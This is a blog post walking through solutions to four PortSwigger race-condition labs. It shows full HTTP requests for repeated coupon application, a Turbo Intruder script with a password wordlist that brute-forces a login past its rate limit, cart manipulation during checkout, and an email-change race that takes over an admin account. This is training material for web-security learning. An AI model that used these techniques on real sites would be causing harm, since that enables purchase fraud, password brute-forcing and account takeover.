---
layout: post
title:  Race Conditions Labs
date:   2024-07-17 12:34:11 +0100
categories: race-conditions
post_id: 6
---

Solutions to the race conditions labs by [Portswigger](https://portswigger.net/web-security/race-conditions)

### [Lab 1: Limit overrun race conditions](https://portswigger.net/web-security/race-conditions/lab-race-conditions-limit-overrun)

### Lab 1 Task

***This lab's purchasing flow contains a race condition that enables you to purchase items for an unintended price.***

***To solve the lab, successfully purchase a Lightweight L33t Leather Jacket.***

**You can log in to your account with the following credentials: *wiener:peter*.**

### Lab 1 Solution

We start out with $50 in our account and the *Lightweight L33t Leather Jacket* costs $1337.00. A promo code **PROMO20** has been provided which gives a 20% discount on the purchase. The following request shows applying the promo code to the purchase:

```http
POST /cart/coupon HTTP/2
Host: 0ab300960360e780855058490095003b.web-security-academy.net
Cookie: session=bTGkDicqOTIfAhgVb6vXVlWapEox7wr4
Content-Length: 52
Cache-Control: max-age=0
Sec-Ch-Ua: "Not/A)Brand";v="8", "Chromium";v="126"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-GB
Upgrade-Insecure-Requests: 1
Origin: https://0ab300960360e780855058490095003b.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.57 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0ab300960360e780855058490095003b.web-security-academy.net/cart
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

csrf=NPSU5rNspzOT2VWiQpLcrAIjbpojcVJK&coupon=PROMO20
```

The server responds as shown below:

```http
HTTP/2 302 Found
Location: /cart
X-Frame-Options: SAMEORIGIN
Content-Length: 14

Coupon applied
```

the promo code has been applied successfully, but it's just 20% off the original price, and we only have $50 in our account. We need to find a way to purchase the jacket for $50 or less. The obvious way is if we can repeatedly use the promo code to get the price down to $50 or less, but the server will not allow us to apply the promo code more than once. We get the following response when we try to apply the promo code again:

```http
HTTP/2 302 Found
Location: /cart?couponError=COUPON_ALREADY_APPLIED&coupon=PROMO20
X-Frame-Options: SAMEORIGIN
Content-Length: 22

Coupon already applied
```

But what if we can make the above request multiple times in parallel? We could make the server apply the 20% off multiple times before it can check if the promo code has been applied before. We utilize the [single packet attack](https://portswigger.net/research/smashing-the-state-machine) by James Kettle to make the request multiple times in parallel. Lucky for us Burp repeater already has this feature built-in. All we have to do is create multiple repeater tabs and add them to the same tab group, select the single packet attack option and send group. The image below shows the setup:

![lab1](https://ethic41.github.io/assets/images/posts/race-conditions-labs/2024-07-17_13-48_lab1_repeater.png)

We get response from the that the promo code has been applied for all the requests(you may have to try this multiple times to get the desired result). Going back to the cart page we see that the price of the jacket has been reduced to less than $50. We can now proceed to purchase the jacket and solve the lab. The image below shows the cart page:

![lab1](https://ethic41.github.io/assets/images/posts/race-conditions-labs/2024-07-17_12-06_lab1_solved.png)

Lab 1 solved.

### [Lab 2: Bypassing rate limits via race conditions](https://portswigger.net/web-security/race-conditions/lab-race-conditions-bypassing-rate-limits)

### Lab 2 Task

***This lab's login mechanism uses rate limiting to defend against brute-force attacks. However, this can be bypassed due to a race condition.***

***To solve the lab:***

**1. Work out how to exploit the race condition to bypass the rate limit.**
**2. Successfully brute-force the password for the user carlos.**
**3. Log in and access the admin panel.**
**4. Delete the user carlos.**

***You can log in to your account with the following credentials: wiener:peter.***

### Lab 2 Solution

A rate limit has been set on the login page, it kicks in after 3 failed login attempts. Below is the request to the login page:

```http
POST /login HTTP/2
Host: 0ae800fa03430b5683a273c5002a00ba.web-security-academy.net
Cookie: session=7nBqtrR6NbeqBYOEmGKAKHQohEkvLfDw
Content-Length: 69
Cache-Control: max-age=0
Sec-Ch-Ua: "Not/A)Brand";v="8", "Chromium";v="126"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-GB
Upgrade-Insecure-Requests: 1
Origin: https://0ae800fa03430b5683a273c5002a00ba.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.57 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0ae800fa03430b5683a273c5002a00ba.web-security-academy.net/login
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

csrf=I8L3M3lu0dkyAh7bQ1DxfkKJ22bn6DVG&username=carlos&password=123321
```

The response below shows that rate limit has been reached:

![lab2](https://ethic41.github.io/assets/images/posts/race-conditions-labs/2024-07-18_01-23_lab2_rate-limit.png)

Luckily this lab is similar to the previous one, we've also been provided with a wordlist to brute force the password. We just need to send a large number of requests in parallel using the single packet attack. This is where turbo intruder comes in handy. We can use turbo intruder to send multiple requests in parallel. Below is the code to send the requests:

```python
def queueRequests(target, wordlists):

    # if the target supports HTTP/2, use engine=Engine.BURP2 to trigger the single-packet attack
    # if they only support HTTP/1, use Engine.THREADED or Engine.BURP instead
    # for more information, check out https://portswigger.net/research/smashing-the-state-machine
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2
                           )
    wordlists = ["123123", "abc123", "football", "monkey", "letmein", "shadow", "master", "666666", "qwertyuiop", "123321", "mustang", "123456", "password",
                "12345678", "qwerty", "123456789", "12345", "1234", "111111", "1234567", "dragon", "1234567890", "michael", "x654321", "superman", "1qaz2wsx", 
                "baseball", "7777777", "121212", "000000"]

    # the 'gate' argument withholds part of each request until openGate is invoked
    # if you see a negative timestamp, the server responded before the request was complete
    for word in wordlists:
        engine.queue(target.req, word, gate='race1')

    # once every 'race1' tagged request has been queued
    # invoke engine.openGate() to send them in sync
    engine.openGate('race1')


def handleResponse(req, interesting):
    table.add(req)
```

Starting the attack the following response is obtained:

![lab2](https://ethic41.github.io/assets/images/posts/race-conditions-labs/2024-07-18_01-42_lab2_attack-table.png)

By sorting the table by the response status code we notice a single request with a 302 status code, this is the request that successfully logged in. We can now proceed to delete the user *carlos* and solve the lab. The image below shows the admin panel:

![lab2](https://ethic41.github.io/assets/images/posts/race-conditions-labs/2024-07-18_01-46_lab2_admin-panel.png)

Now we can delete the user *carlos* and solve the lab.

![lab2](https://ethic41.github.io/assets/images/posts/race-conditions-labs/2024-07-18_01-48_lab2_users.png)

Below is the request to delete the user *carlos*:

```http
GET /admin/delete?username=carlos HTTP/2
Host: 0ae800fa03430b5683a273c5002a00ba.web-security-academy.net
Cookie: session=U06EP2vErkQsawlzICNVHhAADJPO2BbC
Sec-Ch-Ua: "Not/A)Brand";v="8", "Chromium";v="126"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-GB
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.57 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0ae800fa03430b5683a273c5002a00ba.web-security-academy.net/admin
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

```

Response image below:

![lab2](https://ethic41.github.io/assets/images/posts/race-conditions-labs/2024-07-18_01-51_lab2_solved.png)

Lab 2 solved.

### [Lab 3: Multi-endpoint race conditions](https://portswigger.net/web-security/race-conditions/lab-race-conditions-multi-endpoint)

### Lab 3 Task

***This lab's purchasing flow contains a race condition that enables you to purchase items for an unintended price.***

***To solve the lab, successfully purchase a Lightweight L33t Leather Jacket.***

**You can log in to your account with the following credentials: *wiener:peter*.**

### Lab 3 Solution

The name of the lab suggests we have to exploit a race condition between multiple endpoints. We start out with $100 in our account and the *Lightweight L33t Leather Jacket* costs $1337.00. So we need to figure out a way to purchase the jacket for $100 or less.

![lab3-initial-store-credits](https://ethic41.github.io/assets/images/posts/race-conditions-labs/2024-07-23_02-41_lab3_store-credit.png)

The lab has a functionality that allows us to add items to our cart and also checkout. Since during the checkout process payment is also made, it made sense to try adding more items to the cart once the checkout process has started. Using the single packet attack we can send multiple requests in parallel to add more items to the cart. We first add to items to the cart each worth $10, we also add the checkout request to the repeater group, we then add the request to add the jacket to the cart to the repeater group. When the requests are sent the checkout process begins the system checks if the user has enough funds to purchase the items in the cart, but before the order is completed the request to add the jacket to the cart is received and the jacket is added to the cart, when the order gets completed the jacket is also included in the order and the lab is solved. The image below shows the setup:

![lab3-solved-repeater-setup](https://ethic41.github.io/assets/images/posts/race-conditions-labs/2024-07-23_03-08_lab3_solved.png)

Lab 3 solved.

### [Lab 4: Single-endpoint race conditions](https://portswigger.net/web-security/race-conditions/lab-race-conditions-single-endpoint)

### Lab 4 Task

***This lab's email change feature contains a race condition that enables you to associate an arbitrary email address with your account.***

***Someone with the address carlos@ginandjuice.shop has a pending invite to be an administrator for the site, but they have not yet created an account. Therefore, any user who successfully claims this address will automatically inherit admin privileges.***

***To solve the lab:***

- **Identify a race condition that lets you claim an arbitrary email address.**
- **Change your email address to carlos@ginandjuice.shop.**
- **Access the admin panel.**
- **Delete the user carlos**

**You can log in to your own account with the following credentials: *wiener:peter*.**

***You also have access to an email client, where you can view all emails sent to @exploit-<YOUR-EXPLOIT-SERVER-ID>.exploit-server.net addresses.***

This one is really easy, because everything is keyed on my session id, all we have to do is use the update email address functionality, we queue up a bunch of requests to change the email address in burp repeater group, the request will contain both the email address of the user we are trying to takeover, with a few tries we will receive an email in our mail client with the admin confirmation link, we can then use the link to confirm the email change and solve the lab. The image below shows the setup:

![lab4-repeater-setup](https://ethic41.github.io/assets/images/posts/race-conditions-labs/2024-07-25_02-31_lab4_setup.png)

We then get the email in our mail client:

![lab4-email](https://ethic41.github.io/assets/images/posts/race-conditions-labs/2024-07-25-02-34_lab4_mail.png)

Once we confirm the email change we can access the admin panel and delete the user *carlos* to solve the lab.

![lab4-admin-panel](https://ethic41.github.io/assets/images/posts/race-conditions-labs/2024-07-25-02-37_lab4_admin.png)

![lab4-delete-user](https://ethic41.github.io/assets/images/posts/race-conditions-labs/2024-07-25-02-42_lab4_users.png)

![lab4-solved](https://ethic41.github.io/assets/images/posts/race-conditions-labs/2024-07-25-02-40_lab4_solved.png)